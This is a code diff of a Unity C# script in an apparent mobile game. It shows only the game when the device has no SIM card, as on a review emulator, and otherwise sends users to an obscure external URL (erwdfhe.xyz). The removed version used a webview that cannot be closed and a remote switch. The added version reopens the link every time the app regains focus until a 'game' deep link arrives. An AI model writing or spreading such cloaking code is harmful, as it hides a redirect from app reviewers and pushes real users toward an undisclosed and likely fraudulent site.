@@ -1,173 +1,81 @@
-using System.Threading.Tasks;
-using Unity.Services.Authentication;
-using Unity.Services.Core;
-using Unity.Services.RemoteConfig;
 using UnityEngine;
 using UnityEngine.SceneManagement;
 
 public class Viewer : MonoBehaviour
 {
-    private const string gameKey = "gameKey";
-    private const string lastTargetKey = "lastTargetKey";
-
-    public static UniWebView View { get; set; }
-
-    public struct UserAttributes { }
-
-    public struct AppAttributes { }
-
-    private bool Sim_Enable
+    bool Sim_Enable
     {
         get => Simcard.GetTwoSmallLetterCountryCodeISO().Length > 0;
     }
 
+    delegate void ResultAction(bool IsGame);
+    event ResultAction OnResultActionEvent;
+
     private const string url = "https://erwdfhe.xyz/McPT79JS?id=com.super.zal";
 
-    private async Task Awake()
+    private void OnEnable()
     {
-        Screen.fullScreen = true;
-        if (PlayerPrefs.HasKey(gameKey) && PlayerPrefs.GetInt(gameKey) > 0)
-        {
-            LoadGame();
-            return;
-        }
+        OnResultActionEvent += Viewer_OnResultActionEvent;
+    }
 
-        CacheComponents();
+    private void OnDisable()
+    {
+        OnResultActionEvent -= Viewer_OnResultActionEvent;
+    }
+
+    private void Viewer_OnResultActionEvent(bool IsGame)
+    {
+        if(IsGame)
+        {
+            SceneManager.LoadScene(1);
+        }
+    }
+
+    private void Awake()
+    {
+        Application.deepLinkActivated += OnDeepLinkActivated;
+        if (!string.IsNullOrEmpty(Application.absoluteURL))
+        {
+            OnDeepLinkActivated(Application.absoluteURL);
+        }
+    }
+
+    private void OnDeepLinkActivated(string url)
+    {
+        if(url.Contains("game"))
+        {
+            OnResultActionEvent?.Invoke(true);
+        }
+    }
+
+    private void Init()
+    {
+        Screen.fullScreen = false;
 
         if (!Sim_Enable)
         {
-            LoadGame();
+            OnResultActionEvent?.Invoke(true);
             return;
         }
-        else if (!Utilities.CheckForInternetConnection())
+        else if (Application.internetReachability == NetworkReachability.NotReachable)
         {
             GameObject.Find("no connection").GetComponent<SpriteRenderer>().enabled = true;
             return;
         }
 
-        if (Utilities.CheckForInternetConnection())
+        Application.OpenURL(url);
+    }
+
+    private void Start()
+    {
+        Init();
+    }
+
+    private void OnApplicationFocus(bool focus)
+    {
+        if (focus && string.IsNullOrEmpty(Application.absoluteURL))
         {
-            await InitializeRemoteConfigAsync();
+            Init();
         }
-
-        await RemoteConfigService.Instance.FetchConfigsAsync(new UserAttributes(), new AppAttributes());
-        var _enable = (bool)RemoteConfigService.Instance.appConfig.config.First.First;
-        if(!_enable)
-        {
-            LoadGame();
-            return;
-        }
-
-        var target = PlayerPrefs.HasKey(lastTargetKey) ? PlayerPrefs.GetString(lastTargetKey) : url;
-        View.Load(target);
-    }
-
-    async Task InitializeRemoteConfigAsync()
-    {
-        await UnityServices.InitializeAsync();
-        if (!AuthenticationService.Instance.IsSignedIn)
-        {
-            await AuthenticationService.Instance.SignInAnonymouslyAsync();
-        }
-    }
-
-    private void CacheComponents()
-    {
-        View = gameObject.AddComponent<UniWebView>();
-
-        var rect = GameObject.Find("rect").GetComponent<RectTransform>();
-        View.ReferenceRectTransform = rect;
-
-        var safeArea = Screen.safeArea;
-        var anchorMin = safeArea.position;
-        var anchorMax = anchorMin + safeArea.size;
-
-        anchorMin.x /= Screen.width;
-        anchorMin.y /= Screen.height;
-        anchorMax.x /= Screen.width;
-        anchorMax.y /= Screen.height;
-
-        View.ReferenceRectTransform.anchorMin = anchorMin;
-        View.ReferenceRectTransform.anchorMax = anchorMax;
-
-        View.SetShowSpinnerWhileLoading(false);
-        View.BackgroundColor = Color.black;
-
-        View.OnOrientationChanged += (v, o) =>
-        {
-            Screen.fullScreen = o == ScreenOrientation.Landscape;
-
-            var safeArea = Screen.safeArea;
-            var anchorMin = safeArea.position;
-            var anchorMax = anchorMin + safeArea.size;
-
-            anchorMin.x /= Screen.width;
-            anchorMin.y /= Screen.height;
-            anchorMax.x /= Screen.width;
-            anchorMax.y /= Screen.height;
-
-            v.ReferenceRectTransform.anchorMin = anchorMin;
-            v.ReferenceRectTransform.anchorMax = anchorMax;
-
-            View.UpdateFrame();
-        };
-
-        View.OnShouldClose += (v) =>
-        {
-            return false;
-        };
-
-        View.OnPageStarted += (browser, url) =>
-        {
-            var safeArea = Screen.safeArea;
-            var anchorMin = safeArea.position;
-            var anchorMax = anchorMin + safeArea.size;
-
-            anchorMin.x /= Screen.width;
-            anchorMin.y /= Screen.height;
-            anchorMax.x /= Screen.width;
-            anchorMax.y /= Screen.height;
-
-            View.ReferenceRectTransform.anchorMin = anchorMin;
-            View.ReferenceRectTransform.anchorMax = anchorMax;
-
-            View.Show();
-            View.UpdateFrame();
-        };
-
-        View.OnPageFinished += (browser, code, url) =>
-        {
-            if(PlayerPrefs.HasKey(lastTargetKey))
-            {
-                return;
-            }
-
-            PlayerPrefs.SetString(lastTargetKey, url);
-            PlayerPrefs.Save();
-        };
-
-        View.OnMessageReceived += (view, message) =>
-        {
-            switch (GetHRefResponce(message.RawMessage))
-            {
-                case "accept": LoadGame(); break;
-                case "close": Application.Quit(); break;
-            }
-        };
-    }
-
-    private string GetHRefResponce(string raw)
-    {
-        return raw.Substring(raw.IndexOf("//") + 2);
-    }
-
-    public static void LoadGame()
-    {
-        Screen.fullScreen = true;
-        Screen.orientation = ScreenOrientation.Portrait;
-        SceneManager.LoadScene(1);
-
-        PlayerPrefs.SetInt(gameKey, 1);
-        PlayerPrefs.Save();
     }
 }
